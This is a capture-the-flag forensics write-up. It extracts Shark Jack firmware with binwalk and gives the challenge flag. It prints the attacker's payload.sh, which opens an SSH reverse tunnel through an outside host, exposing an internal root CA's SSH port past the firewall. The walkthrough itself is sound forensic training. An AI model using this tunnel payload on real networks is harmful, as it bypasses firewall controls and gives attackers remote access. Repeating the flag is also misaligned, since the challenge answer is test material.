# Controlled Access

* **Category:** Forensics
* **Points:** 50
* **Challenge:** We've been asked to help a certificate authority figure out what a device they found plugged into their network was doing. They were able to dump the firmware and would like to know if it allowed the attacker to connect to any devices that their firewall (which blocks inbound SSH) would have stopped. Their internal domain uses 'digisigner.local' for DNS host names. The flag is the hostname of the internal host that the hacker targeted (i.e. ACI{[local hostname targeted]})
* **Hint #1:** A tool like binwalk might be useful for inspecting the firmware.
* **Hint #2:** The [documentation](https://docs.hak5.org/hc/en-us/categories/360002117973-Shark-Jack) mentions that the 'attack' payload for this device lives in a very particular spot on the filesystem..

<br /> 

First, lets use `binwalk` to search through the binary file for any other embedded files:
```
binwalk -e firmware.bin

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             uImage header, header size: 64 bytes, header CRC: 0x1E09FA95, created: 2019-11-06 04:52:00, image size: 1467840 bytes, Data Address: 0x80000000, Entry Point: 0x80000000, data CRC: 0x71E0036C, OS: Linux, CPU: MIPS, image type: OS Kernel Image, compression type: lzma, image name: "MIPS OpenWrt Linux-4.14.109"
64            0x40            LZMA compressed data, properties: 0x6D, dictionary size: 8388608 bytes, uncompressed size: 4644588 bytes
1467904       0x166600        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 7125278 bytes, 1024 inodes, blocksize: 262144 bytes, created: 2020-04-23 14:56:04
```

<br />

Now lets take a look at everything binwalk extracted:
```
ls -la _firmware.bin.extracted/

total 19904
drwxr-xr-x  3 root root    4096 May 11 20:58 .
drwxr-xr-x  3 root root    4096 May 11 20:58 ..
-rw-r--r--  1 root root 7125278 May 11 20:58 166600.squashfs
-rw-r--r--  1 root root 4644588 May 11:w 20:58 40
-rw-r--r--  1 root root 8594880 May 11 20:58 40.7z
drwxr-xr-x 16 root root    4096 Nov  5  2019 squashfs-root
```

<br />

Looks like this device, Shark Jack,  has an embedded Linux filesystem, SquashFS.  Digging into the [documentation](https://docs.hak5.org/hc/en-us/articles/360034130934-Directory-Structure), the payload to be executed should be located in /root/payload:
```
ls -la squashfs-root/root/payload/

total 12
drwxr-xr-x 2 root root 4096 Nov  5  2019 .
drwxr-xr-x 3 root root 4096 Nov  5  2019 ..
-rw-r--r-- 1 root root  276 Apr 23 10:56 payload.sh

cat squashfs-root/root/payload/payload.sh 

#!/bin/bash
#
# Title:         Secure Shark Jacker
# Author:        Mr. Robot
# Version:       13.37
#
INTERNAL_HOST=rootca.digisigner.local
INTERNAL_PORT=22

function run() {
    ssh -R localhost:31337:$INTERNAL_HOST:$INTERNAL_PORT garyhost@10.57.1.7
}


# Run payload
run &
```

<br /> 

We can see from the contents of the payload that the hacker targeted the internal host rootca.digisigner.local.


## Flag: ACI{rootca.digisigner.local}

